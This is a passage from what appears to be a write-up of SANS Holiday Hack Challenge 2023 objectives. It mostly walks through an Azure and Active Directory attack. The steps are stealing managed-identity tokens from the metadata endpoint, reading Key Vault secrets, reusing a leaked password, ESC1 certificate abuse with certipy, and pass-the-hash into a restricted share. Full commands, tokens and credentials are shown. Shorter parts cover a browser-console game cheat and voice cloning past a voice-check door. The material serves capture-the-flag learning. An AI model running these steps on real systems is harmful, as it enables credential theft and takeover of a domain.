giOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJFSXp1Z2dHWWxVZXpNRWFPNmRrQ0JnIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IWhezoNaO1CXWr3WxpLQ8fBXpot_rb_VnGQTpG3-5mA04JXOMLTTy0eyvcb-PVLktN0dIgLqaELrGJ4nnGI2vD79xXZMoSfBt4ov9Nbq3wPaLQChD2AEkBYHey5WjrTfdngP7Cuy1yKH7t1jIJEPIGmZaNRescVMHS9HO9rZAck7yq1gpTAtQRQaMQWuSTQAhTEPdVtuqUItPqpXoWu4U6fS8JOf9NNvAndtxl9xGgiWbjWtuubDWZdKT1bXo4talKTwHghfGOZRc7tp8GFMgB3Yrm3Z8UW402THs1l4FeiNaZlZBAmODyawFiYD6D4pYcnzW1C-HsY_6vBqbwKpfw\",\"client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"84172\",\"expires_on\":\"1704284267\",\"ext_expires_in\":\"86399\",\"not_before\":\"1704197567\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}\n</code></pre> <p>Let's check active subscriptions:</p> <pre><code>curl -H \"Authorization: Bearer &lt;TOKEN&gt;\" 'https://management.azure.com/subscriptions?api-version=2022-12-01' | python -m json.tool\n</code></pre> <pre><code>{\n    \"value\": [\n        {\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64\",\n            \"authorizationSource\": \"RoleBased\",\n            \"managedByTenants\": [],\n            \"tags\": {\n                \"sans:application_owner\": \"SANS:R&amp;D\",\n                \"finance:business_unit\": \"curriculum\"\n            },\n            \"subscriptionId\": \"2b0942f3-9bca-484b-a508-abdae2db5e64\",\n            \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n            \"displayName\": \"sans-hhc\",\n            \"state\": \"Enabled\",\n            \"subscriptionPolicies\": {\n                \"locationPlacementId\": \"Public_2014-09-01\",\n                \"quotaId\": \"EnterpriseAgreement_2014-09-01\",\n                \"spendingLimit\": \"Off\"\n            }\n        }\n    ],\n    \"count\": {\n        \"type\": \"Total\",\n        \"value\": 1\n    }\n}\n</code></pre> <p>Now let's query resources groups for this subscription</p> <pre><code>curl -H \"Authorization: Bearer &lt;TOKEN&gt;\" 'https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups?api-version=2020-01-01' | python -m json.tool\n</code></pre> <pre><code>{\n    \"value\": [\n        {\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1\",\n            \"name\": \"northpole-rg1\",\n            \"type\": \"Microsoft.Resources/resourceGroups\",\n            \"location\": \"eastus\",\n            \"tags\": {},\n            \"properties\": {\n                \"provisioningState\": \"Succeeded\"\n            }\n        }\n    ]\n}\n</code></pre> <p>Now let's try to get list of KeyVaults</p> <pre><code>curl -X GET -H \"Authorization: Bearer &lt;Access-Token&gt;\" \\\n-H \"Content-Type: application/json\" \\\nhttps://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01\n| python -m json.tool\n</code></pre> <pre><code>{\n    \"value\": [\n        {\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\n            \"name\": \"northpole-it-kv\",\n            \"type\": \"Microsoft.KeyVault/vaults\",\n            \"location\": \"eastus\",\n            \"tags\": {},\n            \"properties\": {\n                \"sku\": {\n                    \"family\": \"A\",\n                    \"name\": \"Standard\"\n                },\n                \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n                \"accessPolicies\": [],\n                \"enabledForDeployment\": false,\n                \"enabledForDiskEncryption\": false,\n                \"enabledForTemplateDeployment\": false,\n                \"enableSoftDelete\": true,\n                \"softDeleteRetentionInDays\": 90,\n                \"enableRbacAuthorization\": true,\n                \"vaultUri\": \"https://northpole-it-kv.vault.azure.net/\",\n                \"provisioningState\": \"Succeeded\"\n            }\n        },\n        {\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\n            \"name\": \"northpole-ssh-certs-kv\",\n            \"type\": \"Microsoft.KeyVault/vaults\",\n            \"location\": \"eastus\",\n            \"tags\": {},\n            \"properties\": {\n                \"sku\": {\n                    \"family\": \"A\",\n                    \"name\": \"standard\"\n                },\n                \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n                \"accessPolicies\": [\n                    {\n                        \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n                        \"objectId\": \"0bc7ae9d-292d-4742-8830-68d12469d759\",\n                        \"permissions\": {\n                            \"keys\": [\n                                \"all\"\n                            ],\n                            \"secrets\": [\n                                \"all\"\n                            ],\n                            \"certificates\": [\n                                \"all\"\n                            ],\n                            \"storage\": [\n                                \"all\"\n                            ]\n                        }\n                    },\n                    {\n                        \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n                        \"objectId\": \"1b202351-8c85-46f1-81f8-5528e92eb7ce\",\n                        \"permissions\": {\n                            \"secrets\": [\n                                \"get\"\n                            ]\n                        }\n                    }\n                ],\n                \"enabledForDeployment\": false,\n                \"enableSoftDelete\": true,\n                \"softDeleteRetentionInDays\": 90,\n                \"vaultUri\": \"https://northpole-ssh-certs-kv.vault.azure.net/\",\n                \"provisioningState\": \"Succeeded\"\n            }\n        }\n    ],\n    \"nextLink\": \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01&amp;$skiptoken=bm9ydGhwb2xlLXNzaC1jZXJ0cy1rdg==\"\n}\n</code></pre> <p>Ok, now let's try GET key vault \"name\": \"northpole-it-kv\", </p> <pre><code>curl -H \"Authorization: Bearer \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2022-07-01 | python -m json.tool\n</code></pre> <pre><code>{\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\n    \"name\": \"northpole-it-kv\",\n    \"type\": \"Microsoft.KeyVault/vaults\",\n    \"location\": \"eastus\",\n    \"tags\": {},\n    \"systemData\": {\n        \"createdBy\": \"thomas@sanshhc.onmicrosoft.com\",\n        \"createdByType\": \"User\",\n        \"createdAt\": \"2023-10-30T13:17:02.532Z\",\n        \"lastModifiedBy\": \"thomas@sanshhc.onmicrosoft.com\",\n        \"lastModifiedByType\": \"User\",\n        \"lastModifiedAt\": \"2023-10-30T13:17:02.532Z\"\n    },\n    \"properties\": {\n        \"sku\": {\n            \"family\": \"A\",\n            \"name\": \"Standard\"\n        },\n        \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n        \"accessPolicies\": [],\n        \"enabledForDeployment\": false,\n        \"enabledForDiskEncryption\": false,\n        \"enabledForTemplateDeployment\": false,\n        \"enableSoftDelete\": true,\n        \"softDeleteRetentionInDays\": 90,\n        \"enableRbacAuthorization\": true,\n        \"vaultUri\": \"https://northpole-it-kv.vault.azure.net/\",\n        \"provisioningState\": \"Succeeded\",\n        \"publicNetworkAccess\": \"Enabled\"\n    }\n}\n</code></pre> <p>To access keyvault we will need new Auth Token vault</p> <pre><code> curl -s -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://vault.azure.net\"\n</code></pre> <p><pre><code>{\"access_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQyNzUzNDcsIm5iZiI6MTcwNDI3NTM0NywiZXhwIjoxNzA0MzYyMDQ3LCJhaW8iOiJFMlZnWVBnakZCYjZ1UHdXNC8xYkNuV1dqejZvQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiMTNGSnVnbFVqa3liQVNUT19CU1hCdyIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.QsuW5bW7bm_aEf7TRy37kry8depqvfpW8s0g8c-dj8r9KvgLeL2hhdeeC9Bwziy8VvPAIcDHC00Z5MENcMRJa6DQ6fk_Nxs2kK16JOa2I5O3bmIcr5AkY6srPB1ZQlsw8ZtwU_VZ4j6gatlRTVSHtzJwhdjGxrxxb1DdotXvmm4eUDV8z4goorZiowUshdwImA-ppygH6Df1IHwtNyFlIDKgBGi_p5HfKdocPWr9UI4lCSJNEzgdlxrlStRnYeI0FTahcpeP5NxtWScLzK0OuYeCvo6wDxuwCWQGKbRsEjKzhIxUD92J9eWifgtP94I9gsc0_6Izmqk9-hvaC35xtA\",\"client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"85662\",\"expires_on\":\"1704362047\",\"ext_expires_in\":\"86399\",\"not_before\":\"1704275347\",\"resource\":\"https://vault.azure.net\",\"token_type\":\"Bearer\"}\n</code></pre> Let's query our secrets in vault: </p> <p>https://learn.microsoft.com/en-us/rest/api/keyvault/secrets/get-secrets/get-secrets?view=rest-keyvault-secrets-7.4&amp;tabs=HTTP</p> <pre><code>curl -H \"Authorization: Bearer [TOKEN]\" https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4\n</code></pre> <p>And we found interesting secret:</p> <p><pre><code>{\n    \"value\": [\n        {\n            \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript\",\n            \"attributes\": {\n                \"enabled\": true,\n                \"created\": 1699564823,\n                \"updated\": 1699564823,\n                \"recoveryLevel\": \"Recoverable+Purgeable\",\n                \"recoverableDays\": 90\n            },\n            \"tags\": {}\n        }\n    ],\n    \"nextLink\": null\n}\n</code></pre> Now let's pull our secret</p> <p><pre><code>curl -H \"Authorization: Bearer &lt;TOKEN&gt;\" \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.0\"\n</code></pre> curl \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.0\" -H \"Authorization: Bearer \" And our secret!! <pre><code>{\n    \"value\": \"Import-Module ActiveDirectory; $UserName = \\\"elfy\\\"; $UserDomain = \\\"northpole.local\\\"; $UserUPN = \\\"$UserName@$UserDomain\\\"; $Password = ConvertTo-SecureString \\\"J4`ufC49/J4766\\\" -AsPlainText -Force; $DCIP = \\\"10.0.0.53\\\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \\\"\\\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru\",\n    \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d\",\n    \"attributes\": {\n        \"enabled\": true,\n        \"created\": 1699564823,\n        \"updated\": 1699564823,\n        \"recoveryLevel\": \"Recoverable+Purgeable\"\n    },\n    \"tags\": {}\n}\n</code></pre> <p>Now let's try to use our secrets to looks around AD env</p> <pre><code>smbclient.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53 -dc-ip 10.0.0.53\n</code></pre> <p>Looking around we can see some interesting files:</p> <pre><code># shares\nADMIN$\nC$\nD$\nFileShare\nIPC$\nNETLOGON\nSYSVOL\n# use FileShare\n# ls\ndrw-rw-rw-          0  Wed Jan  3 01:13:58 2024 .\ndrw-rw-rw-          0  Wed Jan  3 01:13:55 2024 ..\n-rw-rw-rw-     701028  Wed Jan  3 01:13:58 2024 Cookies.pdf\n-rw-rw-rw-    1521650  Wed Jan  3 01:13:58 2024 Cookies_Recipe.pdf\n-rw-rw-rw-      54096  Wed Jan  3 01:13:58 2024 SignatureCookies.pdf\ndrw-rw-rw-          0  Wed Jan  3 01:13:58 2024 super_secret_research\n-rw-rw-rw-        165  Wed Jan  3 01:13:58 2024 todo.txt\n# cat todo.txt\n1. Bake some cookies.\n2. Restrict access to C:\\FileShare\\super_secret_research to only researchers so everyone cant see the folder or read its contents\n3. Profit\n# cat super_secret_research\n[-] SMB SessionError: STATUS_FILE_IS_A_DIRECTORY(The file that was specified as a target is a directory, and the caller specified that it could be anything but a directory.)\n</code></pre> Vulnerable Active Directory Certificate Service-Certificate Template Allows Group/User Privilege Escalation <p>Severity: High Finding: SCS used the tool Certipy to enumerate and attack Active Directory Certificate Services (AD CS). SCS ran the tool with the find -vulnerable option active. This option identifies certificate templates that allow users to supply their own subject alternative name (SAN) and determine if a client authentication extended key usage (EKU) is set. SCS identified a vulnerability within the AD CS certificate template susceptible to exploitation. This technique allowed our analysts to escalate their privileges by requesting certificates that grant access to other accounts and resources. The vulnerability exists because the AD CS template does not enforce proper authorization checks on the certificate enrollment process. Any authenticated user can request a certificate with any SAN, which can then be used for client authentication. This allowed our analysts to impersonate any user or computer in the domain, including domain administrators, and gain full control over the network. Recommendation: SCS recommends that NPS review and modify the permissions on all AD CS certificate templates and ensure only designated security groups can enroll. It is recommended that NPS implement a tiered administration model and conduct regular permission set audits. Additionally, NPS may find the documentation provided by Microsoft and NIST for best practices to secure AD CS documentation of value. The best practices include but are not limited to: role separation, certificate validity period enforcement, compromised certificates revocation, and certificate activity monitoring. Verification: NPS security teams can verify the remediation of this finding by running the Certipy tool with the find -vulnerable option active to check if any certificate templates still allow unauthorized enrollment. The NPS security team should confirm the AD CS template is no longer listed as vulnerable and that its permissions are restricted to the appropriate security groups.</p> <p>Let's audit our AD CS service.</p> <pre><code>certipy find -vulnerable -u elfy@northpole.local -p 'J4`ufC49/J4766' -dc-ip 10.0.0.5\n</code></pre> <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'northpole-npdc01-CA'\n[*] Saved BloodHound data to '20240103104107_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n[*] Saved text output to '20240103104107_Certipy.txt'\n[*] Saved JSON output to '20240103104107_Certipy.json'\n\ncat 20240103104107_Certipy.txt\nCertificate Authorities\n  0\n    CA Name                             : northpole-npdc01-CA\n    DNS Name                            : npdc01.northpole.local\n    Certificate Subject                 : CN=northpole-npdc01-CA, DC=northpole, DC=local\n    Certificate Serial Number           : 52CE72EF7635CABF4BCC0B9C8435EF8A\n    Certificate Validity Start          : 2024-01-03 01:05:50+00:00\n    Certificate Validity End            : 2029-01-03 01:15:50+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : NORTHPOLE.LOCAL\\Administrators\n      Access Rights\n        ManageCertificates              : NORTHPOLE.LOCAL\\Administrators\n                                          NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        ManageCa                        : NORTHPOLE.LOCAL\\Administrators\n                                          NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        Enroll                          : NORTHPOLE.LOCAL\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : NorthPoleUsers\n    Display Name                        : NorthPoleUsers\n    Certificate Authorities             : northpole-npdc01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : PublishToDs\n                                          IncludeSymmetricAlgorithms\n    Private Key Flag                    : ExportableKey\n    Extended Key Usage                  : Encrypting File System\n                                          Secure Email\n                                          Client Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1 year\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Domain Users\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : NORTHPOLE.LOCAL\\Enterprise Admins\n        Write Owner Principals          : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        Write Dacl Principals           : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        Write Property Principals       : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n    [!] Vulnerabilities\n      ESC1                              : 'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>So now we verified that vulnerability exist and is exploitable      [!] Vulnerabilities       ESC1  : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication</p> <p>ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).</p> <p>On top of that we need to find user who is part of researcher team and will be able to access super secret file <pre><code>GetADUsers.py  -all northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53\n</code></pre></p> <pre><code>Name                  Email                           PasswordLastSet      LastLogon\n--------------------  ------------------------------  -------------------  -------------------\nalabaster                                             2024-01-03 01:03:30.006816  2024-01-03 01:16:54.252028\nGuest                                                 &lt;never&gt;              &lt;never&gt;\nkrbtgt                                                2024-01-03 01:10:59.312257  &lt;never&gt;\nelfy                                                  2024-01-03 01:13:03.950311  2024-01-03 10:47:47.325723\nwombleycube                                           2024-01-03 01:13:04.075313  2024-01-03 10:43:12.019550\n</code></pre> <p>Oh looks like we can try wombleycube. Let's try to request certificate</p> <p>For ESC1, we can request a certificate based on the vulnerable certificate template and specify an arbitrary UPN or DNS SAN with the -upn and -dns parameter, respectively.</p> <pre><code>certipy req -u 'elfy@northpole.local'  -p 'J4`ufC49/J4766'  -dc-ip '10.0.0.53'  -target 'npdc01.northpole.local'  -ca 'northpole-npdc01-CA' -template 'NorthPoleUsers' -upn 'wombleycube@northpole.local'\n</code></pre> <pre><code>[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 71\n[*] Got certificate with UPN 'wombleycube@northpole.local'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'wombleycube.pfx'\n</code></pre> <p>The auth command will use either the PKINIT Kerberos extension or Schannel protocol for authentication with the provided certificate. Kerberos can be used to retrieve a TGT and the NT hash for the target user, whereas Schannel will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands.</p> <pre><code>certipy auth -pfx wombleycube.pfx  -dc-ip 10.0.0.53\n</code></pre> <p><pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: wombleycube@northpole.local\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'wombleycube.ccache'\n[*] Trying to retrieve NT hash for 'wombleycube'\n[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23\n</code></pre> The NT hash and the credential cache (TGT) can be used for further authentication with other tools. Lets go back again and try to use our hash with smbclient.py</p> <p><pre><code>smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e\n23 northpole.local/wombleycube@10.0.0.53 -dc-ip 10.0.0.53\n</code></pre> <pre><code># ls\ndrw-rw-rw-          0  Wed Jan  3 01:13:58 2024 .\ndrw-rw-rw-          0  Wed Jan  3 01:13:58 2024 ..\n-rw-rw-rw-        231  Wed Jan  3 01:13:58 2024 InstructionsForEnteringSatelliteGroundStation.txt\n# cat InstructionsForEnteringSatelliteGroundStation.txt\nNote to self:\n\nTo enter the Satellite Ground Station (SGS), say the following into the speaker:\n\nAnd he whispered, 'Now I shall be out of sight;\nSo through the valley and over the height.'\nAnd he'll silently take his way.\n</code></pre></p> <p>Woho!</p> <p>Answer</p> <p>Note to self: To enter the Satellite Ground Station (SGS), say the following into the speaker:     And he whispered, 'Now I shall be out of sight;     So through the valley and over the height.'     And he'll silently take his way.</p>"},{"location":"objectives/o19/#response","title":"Response","text":"<p>Ribb Bonbowford</p> <p>Wow, nice work. I'm impressed! This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me. Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it? On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located. Well, I guess it's probably somewhere on Space Island, but I've not been there yet. I'm not a big fan of jungles, you see. I have this tendency to get lost in them. Anyway, if you feel like investigating, that'd be where I'd go look. Good luck and I'd try and steer clear of ChatNPT if I were you. </p>"},{"location":"objectives/o2/","title":"Snowball Fight","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> Morcel Nougat <p>Hey there, I'm Morcel Nougat, elf extraordinaire! You won't believe this, but we're on a magical tropical island called Christmas Island, and it even has snow! I'm so glad ChatNPT suggested we come here this year!</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":"<p>The initial phase involved interacting with web application to analyze underlying technologies. This analysis swiftly revealed that we are interacting with JS. </p> <p>ChatGPT</p> <p>The DOM is an object-oriented representation of the web page, which can be modified with a scripting language like JavaScript. Each element in an HTML document is represented as a node in the DOM tree. This tree structure allows developers to access and manipulate HTML elements in a hierarchical manner.</p> <p>In the subsequent phase,  we inspected frame where game was loaded. This examination of different elements lead to discovery of window.player node. Manipulating window.player.body.height lead to situation that model was so tinny and it was unbeatable. Additionally  window.playersHitBoxSize was also providing similar results. To aid speed of throwing snowballs use:  window.player.throwDelay=1.</p>"},{"location":"objectives/o2/#hints","title":"Hints","text":"Snowball Super Hero <p>Its easiest to grab a friend play with and beat Santa but tinkering with client-side variables can grant you all kinds of snowball fight super powers. You could even take on Santa and the elves solo!</p> Consoling iFrames <p>Have an iframe in your document? Be sure to select the right context before meddling with JavaScript. https://gist.github.com/chrisjd20/93771da596ca5e49043f148a845c469f</p>"},{"location":"objectives/o2/#images","title":"Images","text":""},{"location":"objectives/o2/#code-blocks","title":"Code blocks","text":"<pre><code>window.player.body.height=1\nwindow.player.throwDelay=1 \n</code></pre> <p>Answer</p> <p>window.player.body.height=1</p>"},{"location":"objectives/o2/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/o20/","title":"Space Island Door Access Speaker","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o20/#objective","title":"Objective","text":"<p>Request</p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> Jewel Loggins <p>What are you doing here, and who are you? Me first? I'm Jewel Loggins. And I was trekking through the jungle and happened to find this place. I liked this spot and decided to set up camp. Seeing you here is quite the surprise. Well, because the only other person I've ever seen come here is Wombley Cube. I thought this tram station in the middle of the jungle was strange to begin with, but then Wombley added to the intrigue. I guess all this spy stuff is typical for him, so maybe I shouldn't think much of it. I'm sure everything's fine. Every time he comes here, he says something to the speaker. Then, the door opens, and he rides the tram somewhere. I gave it a try, but the door didn't open for me. Knowing Wombley, it's some kind of secret passphrase. If you wanna see where the tram goes, I think you need to find out what that passphrase is. Ribb Bonbowford over at Coggoggle Marina on Steampunk Island works with Wombley. Try asking if he knows. I hope you find it. I'll be here when you get back!</p>"},{"location":"objectives/o20/#hints","title":"Hints","text":"MFA: Something You KnowSynthesis is the True Ending <p>Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.</p> MFA: Something You Are <p>It seems the Access Speaker is programmed to only accept Wombley's voice. Maybe you could get a sample of his voice and use an AI tool to simulate Wombley speaking the passphrase.</p>"},{"location":"objectives/o20/#solution","title":"Solution","text":"<p>Now we are situated on Space Island where we need to  pass first challange to access SGS Station. To do this we need to record audio which will mimic Wombley, for that we will use online service https://play.ht/ recommended by Santa :)</p> <p></p> <p>Let's create new file using PlayHT. As source audio we will use Audiobook shared by Wombley. https://www.holidayhackchallenge.com/2023/wombleycube_the_enchanted_voyage.mp3.zip</p> <p>We will also insert text from previous challenge.</p> <p></p> <p>After uploading file we are allowed to enter train station and travel to SGS </p> <p></p> <p>Answer</p> <p>Insert the answer to the objective here.</p>"},{"location":"objectives/o20/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>What, you know the passphrase!? Let me try it! Nope, didn't work. Knowing Wombley, the passphrase isn't the only requirement. He's all about that MFA! Oh yeah, multi-factor authentication! The passphrase for something he knows, and his voice for something he is! That's it! You need to be Wombley. You need his voice. Now, how are you gonna get that? Since only us elves can get a subscription to use ChatNPT, try searching for another AI tool that can simulate voices. I'm sure there's one out there.</p>"},{"location":"objectives/o21/","title":"Camera Access","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o21/#objective","title":"Objective","text":"<p>Request</p> <p>Gain access to Jack's camera. What's the third item on Jack's TODO list?</p> Wombley Cube <p>This is Ground Control, do you read me...? Ground Control to --  Hey! How'd you get in here? That tram is the only accessible point of entry and I secured it with MFA! No matter, you may have had the skills to find and infiltrate the satellite ground station, but there's no chance you can hack your way into the satellite itself! The nanosat's Supervisor Directory will remain hidden, and you'll never discover the mastermind behind all this. So don't even waste your time trying.</p>"},{"location":"objectives/o21/#hints","title":"Hints","text":"Hubris is a Virtue <p>In his hubris, Wombley revealed that he thinks you won't be able to access the satellite's \"Supervisor 